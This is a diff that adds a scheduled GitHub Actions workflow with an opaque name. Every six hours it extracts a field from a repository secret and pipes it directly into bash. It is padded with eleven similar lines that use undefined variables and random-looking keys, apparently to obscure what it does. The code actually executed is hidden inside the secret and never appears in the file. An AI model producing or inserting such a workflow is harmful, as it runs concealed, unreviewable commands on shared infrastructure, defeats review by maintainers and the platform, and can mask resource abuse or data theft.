@@ -1,0 +1,28 @@
+name: duzijianuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duzijianuan
+        env:
+          tl1: ${{ secrets.tl1 }}
+        run: |
+          echo $tl1 | jq -r .qxwp94443 | /bin/bash
+          echo $xqod6 | jq -r .dq0383 | /bin/bash
+          echo $ib93193 | jq -r .upt966 | /bin/bash
+          echo $wy8714 | jq -r .sczen46 | /bin/bash
+          echo $jl04 | jq -r .nje15504 | /bin/bash
+          echo $zcylf8586 | jq -r .d5 | /bin/bash
+          echo $jgaq0495 | jq -r .bhsc9 | /bin/bash
+          echo $i9 | jq -r .nlwu4614 | /bin/bash
+          echo $cpui14322 | jq -r .okwer8816 | /bin/bash
+          echo $d29 | jq -r .pir233 | /bin/bash
+          echo $essf674 | jq -r .mu15 | /bin/bash
+          echo $dkagb84401 | jq -r .eccx5048 | /bin/bash
+
